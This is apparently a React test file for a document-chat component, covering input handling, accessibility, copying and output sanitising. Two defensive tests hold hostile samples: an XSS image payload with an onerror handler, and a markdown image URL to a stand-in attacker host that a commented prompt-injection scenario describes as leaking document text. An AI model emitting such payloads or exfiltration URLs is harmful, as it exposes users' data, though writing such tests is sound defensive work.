import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { ChatView } from "@/components/chat/ChatView";
import { TooltipProvider } from "@/components/ui/tooltip";
import { api } from "@/lib/api";

function setup(answerText = "Jane is a **data engineer**.") {
  const query = vi.spyOn(api, "query").mockResolvedValue({
    trace_id: "t1",
    question: "q",
    answer: answerText,
    sources: [{ file_name: "cv.pdf", page_number: 1 }],
  });
  render(
    <TooltipProvider>
      <ChatView documentId="docA" fileName="cv.pdf" />
    </TooltipProvider>
  );
  return { query, input: screen.getByRole("textbox", { name: "Ask about this document" }) };
}

afterEach(() => vi.restoreAllMocks());

test("Enter sends, Shift+Enter adds a newline, empty input cannot send", async () => {
  const { query, input } = setup();
  expect(screen.getByRole("button", { name: "Send" })).toBeDisabled();

  await userEvent.type(input, "line one{Shift>}{Enter}{/Shift}line two");
  expect(input).toHaveValue("line one\nline two");
  expect(query).not.toHaveBeenCalled();

  await userEvent.keyboard("{Enter}");
  expect(query).toHaveBeenCalledWith("docA", "line one\nline two");
  expect(input).toHaveValue("");
});

test("two quick Enter presses send one request", async () => {
  const { query, input } = setup();
  await userEvent.type(input, "Who is Jane?{Enter}{Enter}");
  expect(query).toHaveBeenCalledTimes(1);
});

test("HTML in an answer is shown as text, markdown still renders", async () => {
  const { input } = setup("<img src=x onerror=alert(1)> and **bold**");
  await userEvent.type(input, "q{Enter}");
  const strong = await screen.findByText("bold");
  expect(strong.tagName).toBe("STRONG");
  expect(document.querySelector("img")).toBeNull();
});

test("markdown images are not loaded and links open safely in a new tab", async () => {
  // A prompt-injected document could make the model emit an image URL that
  // sends document text to a third party with no click needed
  const { input } = setup("![x](https://evil.example/leak?d=secret) see [docs](https://example.com)");
  await userEvent.type(input, "q{Enter}");
  const link = await screen.findByRole("link", { name: "docs" });
  expect(document.querySelector("img")).toBeNull();
  expect(document.querySelector('link[rel="preload"]')).toBeNull();
  expect(link).toHaveAttribute("target", "_blank");
  expect(link).toHaveAttribute("rel", "noopener noreferrer");
});

test("starter questions send their exact text", async () => {
  const { query } = setup();
  expect(screen.getByRole("heading", { name: "Ask anything about cv.pdf" })).toBeInTheDocument();
  await userEvent.click(screen.getByRole("button", { name: "Who is this about?" }));
  expect(query).toHaveBeenCalledWith("docA", "Who is this about?");
});

test("answers appear in a polite live region with source chips", async () => {
  const { input } = setup();
  await userEvent.type(input, "q{Enter}");
  const log = screen.getByRole("log");
  expect(log).toHaveAttribute("aria-live", "polite");
  expect(await within(log).findByText("data engineer")).toBeInTheDocument();
  expect(within(log).getByText("p.1")).toBeInTheDocument();
});

test("Copy puts the answer on the clipboard", async () => {
  const { input } = setup("Plain answer.");
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
  await userEvent.type(input, "q{Enter}");
  await userEvent.click(await screen.findByRole("button", { name: "Copy answer" }));
  expect(writeText).toHaveBeenCalledWith("Plain answer.");
});
